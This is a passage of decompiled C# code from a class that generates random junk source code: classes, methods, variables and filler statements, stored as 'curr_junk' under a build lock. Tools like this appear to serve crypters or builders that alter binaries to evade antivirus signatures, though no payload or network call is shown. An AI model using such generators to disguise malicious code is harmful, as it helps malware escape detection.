		// Token: 0x06000056 RID: 86 RVA: 0x000048C0 File Offset: 0x000048C0
		public int get_int()
		{
			int num = this.random.Next(0, 5);
			int result = 0;
			bool flag = num == 0;
			if (flag)
			{
				result = this.random.Next(1, 99);
			}
			else
			{
				bool flag2 = num == 1;
				if (flag2)
				{
					result = this.random.Next(1, 9999);
				}
				else
				{
					bool flag3 = num == 2;
					if (flag3)
					{
						result = this.random.Next(1, 999999);
					}
					else
					{
						bool flag4 = num == 3;
						if (flag4)
						{
							result = this.random.Next(1, 99999999);
						}
						else
						{
							bool flag5 = num == 4;
							if (flag5)
							{
								result = this.random.Next(1, 999999999);
							}
						}
					}
				}
			}
			return result;
		}

		// Token: 0x06000057 RID: 87 RVA: 0x0000497C File Offset: 0x0000497C
		private long LongRandom(long min, long max, Random rand)
		{
			byte[] array = new byte[8];
			rand.NextBytes(array);
			long num = BitConverter.ToInt64(array, 0);
			return Math.Abs(num % (max - min)) + min;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000049B4 File Offset: 0x000049B4
		private static float NextFloat(Random random)
		{
			double num = random.NextDouble() * 2.0 - 1.0;
			double num2 = Math.Pow(2.0, (double)random.Next(-126, 128));
			return (float)(num * num2);
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004A04 File Offset: 0x00004A04
		public string make_vars()
		{
			string text = "";
			int num = Convert.ToInt32(this.variable);
			string[] array = new string[num];
			string[] array2 = new string[num];
			int[] array3 = new int[num];
			long[] array4 = new long[num];
			float[] array5 = new float[num];
			int[] array6 = new int[num];
			Implement.VarType varType = Implement.VarType.None;
			foreach (int num2 in array6)
			{
				string text2 = "";
				int num3 = this.random.Next(0, 11);
				bool flag = num3 == 0;
				if (flag)
				{
					text2 = "string %rand% = \"%string%\"; \n";
				}
				else
				{
					bool flag2 = num3 == 1;
					if (flag2)
					{
						text2 = "sbyte %rand% =  %sbyte%; \n";
					}
					else
					{
						bool flag3 = num3 == 2;
						if (flag3)
						{
							text2 = "byte %rand% =  %byte%; \n";
						}
						else
						{
							bool flag4 = num3 == 3;
							if (flag4)
							{
								text2 = "short %rand% = %short%; \n";
							}
							else
							{
								bool flag5 = num3 == 4;
								if (flag5)
								{
									text2 = "ushort %rand% = %ushort%; \n";
								}
								else
								{
									bool flag6 = num3 == 5;
									if (flag6)
									{
										text2 = "uint %rand% = %uint%; \n";
									}
									else
									{
										bool flag7 = num3 == 6;
										if (flag7)
										{
											text2 = "int %rand% = %int%; \n";
										}
										else
										{
											bool flag8 = num3 == 7;
											if (flag8)
											{
												text2 = "long %rand% = %long%; \n";
											}
											else
											{
												bool flag9 = num3 == 8;
												if (flag9)
												{
													text2 = "ulong %rand% = %ulong%; \n";
												}
												else
												{
													bool flag10 = num3 == 9;
													if (flag10)
													{
														text2 = "float %rand% = %float%*; \n";
													}
													else
													{
														bool flag11 = num3 == 10;
														if (flag11)
														{
															text2 = "double %rand% = %double%; \n";
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				int minValue = Convert.ToInt32(this.min);
				int maxValue = Convert.ToInt32(this.max);
				array[num2] = this.rands(this.random.Next(minValue, maxValue));
				text2 = text2.Replace("%rand%", array[num2]);
				bool flag12 = text2.Contains("%string%");
				if (flag12)
				{
					array2[num2] = this.rands(this.random.Next(minValue, maxValue));
					text2 = text2.Replace("%string%", array2[num2]);
					varType = Implement.VarType.String;
				}
				else
				{
					bool flag13 = text2.Contains("%sbyte%");
					if (flag13)
					{
						array3[num2] = this.random.Next(-128, 127);
						text2 = text2.Replace("%sbyte%", array3[num2].ToString());
						varType = Implement.VarType.Sbyte;
					}
					else
					{
						bool flag14 = text2.Contains("%byte%");
						if (flag14)
						{
							array3[num2] = this.random.Next(0, 255);
							text2 = text2.Replace("%byte%", array3[num2].ToString());
							varType = Implement.VarType.Byte;
						}
						else
						{
							bool flag15 = text2.Contains("%short%");
							if (flag15)
							{
								array3[num2] = this.random.Next(-32768, 32767);
								text2 = text2.Replace("%short%", array3[num2].ToString());
								varType = Implement.VarType.Short;
							}
							else
							{
								bool flag16 = text2.Contains("%ushort%");
								if (flag16)
								{
									array3[num2] = this.random.Next(0, 65535);
									text2 = text2.Replace("%ushort%", array3[num2].ToString());
									varType = Implement.VarType.Ushort;
								}
								else
								{
									bool flag17 = text2.Contains("%uint%");
									if (flag17)
									{
										array3[num2] = this.get_int();
										text2 = text2.Replace("%uint%", array3[num2].ToString());
										varType = Implement.VarType.Uint;
									}
									else
									{
										bool flag18 = text2.Contains("%int%");
										if (flag18)
										{
											array3[num2] = this.get_int();
											text2 = text2.Replace("%int%", array3[num2].ToString());
											varType = Implement.VarType.Int;
										}
										else
										{
											bool flag19 = text2.Contains("%long%");
											if (flag19)
											{
												array4[num2] = this.LongRandom(1L, 90000000000000050L, this.random);
												text2 = text2.Replace("%long%", array4[num2].ToString());
												varType = Implement.VarType.Long;
											}
											else
											{
												bool flag20 = text2.Contains("%ulong%");
												if (flag20)
												{
													array4[num2] = this.LongRandom(1L, 90000000000000050L, this.random);
													text2 = text2.Replace("%ulong%", array4[num2].ToString());
													varType = Implement.VarType.Ulong;
												}
												else
												{
													bool flag21 = text2.Contains("%float%");
													if (flag21)
													{
														array5[num2] = Implement.NextFloat(this.random);
														text2 = text2.Replace("%float%", array5[num2].ToString());
														text2 = text2.Replace(",", ".");
														text2 = text2.Replace("*", "F");
														varType = Implement.VarType.Float;
													}
													else
													{
														bool flag22 = text2.Contains("%double%");
														if (flag22)
														{
															array5[num2] = Implement.NextFloat(this.random);
															text2 = text2.Replace("%double%", array5[num2].ToString());
															text2 = text2.Replace(",", ".");
															varType = Implement.VarType.Double;
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				bool flag23 = varType > Implement.VarType.None;
				if (flag23)
				{
					text += text2;
				}
				bool flag24 = varType == Implement.VarType.Double && varType > Implement.VarType.None;
				if (flag24)
				{
					string text3 = this.doublefuncs_[this.random.Next(0, this.doublefuncs_.Length)];
					text3 = text3.Replace("%variable%", array[num2]);
					string text4 = Implement.NextFloat(this.random).ToString();
					text4 = text4.Replace(',', '.');
					string text5 = Implement.NextFloat(this.random).ToString();
					text5 = text5.Replace(',', '.');
					text3 = text3.Replace("%rand_%", text4);
					string text6 = this.doublechoose[this.random.Next(0, this.doublechoose.Length)];
					text6 = text6.Replace("%variable%", array[num2]);
					text6 = text6.Replace("%randv%", this.rands(this.random.Next(5, 30)));
					text6 = text6.Replace("%rand%", text5);
					text3 = text3.Replace("%choose%", text6);
					string text7 = Implement.NextFloat(this.random).ToString();
					text7 = text7.Replace(',', '.');
					string text8 = this.random_func[this.random.Next(0, this.random_func.Length)];
					text8 = text8.Replace("%variable%", array[num2]);
					text8 = text8.Replace("%randv%", this.rands(this.random.Next(5, 30)));
					text8 = text8.Replace("%randv2%", this.rands(this.random.Next(5, 30)));
					text8 = text8.Replace("%rand%", text7);
					text8 = text8.Replace("%randint%", this.random.Next(1, 9999999).ToString());
					text8 = text8.Replace("%randint2%", this.random.Next(1, 99999).ToString());
					text3 = text3.Replace("%dostuff%", text8);
					text += text3;
				}
				bool flag25 = varType == Implement.VarType.Int && varType > Implement.VarType.None;
				if (flag25)
				{
					string text9 = this.intfuncs[this.random.Next(0, 2)];
					text9 = text9.Replace("%variable%", array[num2]);
					string text10 = this.intchoose[this.random.Next(0, 3)];
					text9 = text9.Replace("%rand_%", this.random.Next(1, 999999).ToString());
					text10 = text10.Replace("%variable%", array[num2]);
					text10 = text10.Replace("%rand_%", this.random.Next(1, 999999).ToString());
					text9 = text9.Replace("%intchoose%", text10);
					text9 = text9.Replace("%var_val%", array3[num2].ToString());
					text += text9;
				}
			}
			return text;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00005278 File Offset: 0x00005278
		public string make_void()
		{
			string text = this.voidbase;
			int minValue = Convert.ToInt32(this.min);
			int maxValue = Convert.ToInt32(this.max);
			string newValue = this.rands(this.random.Next(minValue, maxValue));
			text = text.Replace("%void%", newValue);
			return text.Replace("//junk", this.make_vars());
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000052E0 File Offset: 0x000052E0
		public string make_class()
		{
			string text = this.base1;
			int minValue = Convert.ToInt32(this.min);
			int maxValue = Convert.ToInt32(this.max);
			string newValue = this.rands(this.random.Next(minValue, maxValue));
			text = text.Replace("%class%", newValue);
			for (int i = 0; i < this.functions; i++)
			{
				text += this.make_void();
			}
			return text + "\n} ";
		}

		// Token: 0x0600005C RID: 92 RVA: 0x0000536C File Offset: 0x0000536C
		public string construct()
		{
			string str = "";
			this.min = Implement._rng.Next(5, 10);
			this.max = Implement._rng.Next(10, 30);
			this.classes = Implement._rng.Next(1, 5);
			this.functions = Implement._rng.Next(1, 10);
			this.variable = Implement._rng.Next(10, 35);
			for (int i = 0; i < this.classes; i++)
			{
				str += this.make_class();
			}
			this.curr_junk = str;
			return this.curr_junk;
		}

		// Token: 0x04000028 RID: 40
		private static string[] UpperWords = File.ReadAllLines("caseWords.txt");

		// Token: 0x04000029 RID: 41
		private static string[] LowerWords = File.ReadAllLines("lowWords.txt");

		// Token: 0x0400002A RID: 42
		private static readonly Random _rng = new Random();

		// Token: 0x0400002B RID: 43
		private const string _chars = "aqwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";

		// Token: 0x0400002C RID: 44
		public object LockBuild = new object();

		// Token: 0x0400002D RID: 45
		public string base1 = "public class %class%{";

		// Token: 0x0400002E RID: 46
		public string voidbase = "public void %void%(){\r\n//junk\r\n}";

		// Token: 0x0400002F RID: 47
		private Random random = new Random();

		// Token: 0x04000030 RID: 48
		public string[] intchoose = new string[]
		{
			"%variable% += %rand_%;",
			"%variable% = %rand_%;",
			"%variable% = %variable% + %rand_%;"
		};

		// Token: 0x04000031 RID: 49
		public string[] intfuncs = new string[]
		{
			"while(%variable% == %var_val%){\r\n%intchoose%\r\n}",
			"if(%variable% == %rand_%){\r\n%intchoose%\r\n}"
		};

		// Token: 0x04000032 RID: 50
		public string[] random_func = new string[]
		{
			"",
			"",
			"Console.Write(%variable%.ToString());",
			"Console.WriteLine(%variable%.ToString());",
			"MessageBox.Show(%variable%.ToString());",
			"try{\r\nConsole.WriteLine(%variable%.ToString());\r\n}catch(Exception ex){\r\nConsole.WriteLine(ex.Message);\r\n}",
			"try{\r\nMessageBox.Show(%variable%.ToString());\r\n}catch(Exception ex){\r\nMessageBox.Show(ex.Message);\r\n}",
			"Console.ReadKey();",
			"Console.ReadLine();",
			"object %randv%;\r\n%randv% = %rand%;",
			"for( ; ;) {\r\nConsole.WriteLine(%rand%);\r\n}",
			"int? %randv% = %randint%;\r\n%randv% += %randint2%;",
			" bool? %randv% = new bool?();\r\n%randv% = true;",
			"object %randv%;\r\n%randv% = %rand%;\r\nConsole.WriteLine(%randv%.ToString().ToLower());",
			"try{\r\nint %randv% = %randint%;\r\nif(%randv% == %randint2%){\r\n%randv%++;\r\n}else{\r\n%randv%--;\r\n}\r\n}catch(Exception ex){\r\nMessageBox.Show(ex.Message);\r\n}",
			"try{\r\nint %randv% = %randint%;\r\nif(%randv% == %randint2%){\r\n%randv%++;\r\n}else{\r\n%randv%--;\r\nConsole.Write(%randv%.ToString());\r\n}\r\n}catch(Exception ex){\r\nMessageBox.Show(ex.Message);\r\n}",
			"int[] %randv% = { %randint% , %randint2% } ;\r\nRandom %randv2%= new Random();\r\nConsole.WriteLine(%randv%[%randv2%.Next(0,2)]);"
		};

		// Token: 0x04000033 RID: 51
		public string[] doublechoose = new string[]
		{
			"%variable% = Math.Pow(double.MinValue, double.MaxValue);",
			"%variable% = Math.Pow(2, 2.1);",
			"%variable% = Math.Pow(double.NegativeInfinity, 2);",
			"%variable% = Math.Pow(5, 2);",
			"%variable% = Math.Floor((double)%rand%);",
			"double %randv% = %rand%;\r\n%variable% = Math.Round(%randv%);",
			"double %randv% = %rand%;\r\n%variable% = Math.Round(%randv% ,1,MidpointRounding.ToEven);",
			"double %randv% = %rand%;\r\n%variable% = Math.Floor((double)%randv%);",
			"double %randv% = %rand%;\r\n%variable% = Math.Ceiling(%randv%);",
			"%variable% = Math.Ceiling(Math.Acos(0));",
			"%variable% = Math.Ceiling(Math.Cos(2));",
			"%variable% = Math.Ceiling(Math.Cosh(5));",
			"%variable% = Math.Ceiling(Math.Asin(0.2));",
			"%variable% = Math.Ceiling(Math.Sin(2));",
			"%variable% = Math.Ceiling(Math.Sinh(-5));",
			"%variable% = Math.Ceiling(Math.Atan(-5));",
			"%variable% = Math.Ceiling(Math.Tan(1));",
			"%variable% = Math.Ceiling(Math.Tanh(0.1));",
			"double %randv% = Math.IEEERemainder(3, 4);\r\n%variable% = %randv%;",
			"double %randv% = Math.Log(1000, 10);\r\n%variable% = %randv%;",
			"double %randv% = %rand%;\r\n%variable% = %randv% / 3;",
			"double %randv% = %rand%;\r\n%variable% = %randv% * 2;",
			"%variable% = Math.Exp(2);",
			"%variable% = Math.Truncate(%variable%);",
			"%variable% = Math.Sqrt(4);",
			"double %randv% = %rand%;\r\n%randv% = Math.Sqrt(3);\r\n%variable% = %randv%;"
		};

		// Token: 0x04000034 RID: 52
		public string[] doublefuncs_ = new string[]
		{
			"if(%variable% == %rand_%){\r\n%choose%\r\n%dostuff%\r\n}",
			"while(%variable% == %rand_%){\r\n%choose%\r\n%dostuff%\r\n}",
			"%choose%\r\n%dostuff%"
		};

		// Token: 0x04000035 RID: 53
		private int min;

		// Token: 0x04000036 RID: 54
		private int max;

		// Token: 0x04000037 RID: 55
		private int functions;

		// Token: 0x04000038 RID: 56
		private int classes;

		// Token: 0x04000039 RID: 57
		private int variable;

		// Token: 0x0400003A RID: 58
		public string curr_junk = "";

		// Token: 0x02000029 RID: 41
		public enum VarType
		{
			// Token: 0x0400009D RID: 157
			None,
			// Token: 0x0400009E RID: 158
			String,
			// Token: 0x0400009F RID: 159
			Int,
			// Token: 0x040000A0 RID: 160
			Uint,
			// Token: 0x040000A1 RID: 161
			Ushort,
			// Token: 0x040000A2 RID: 162
			Short,
			// Token: 0x040000A3 RID: 163
			Byte,
			// Token: 0x040000A4 RID: 164
			Sbyte,
			// Token: 0x040000A5 RID: 165
			Float,
			// Token: 0x040000A6 RID: 166
			Double,
			// Token: 0x040000A7 RID: 167
			Long,
			// Token: 0x040000A8 RID: 168
			Ulong
		}
	}
}
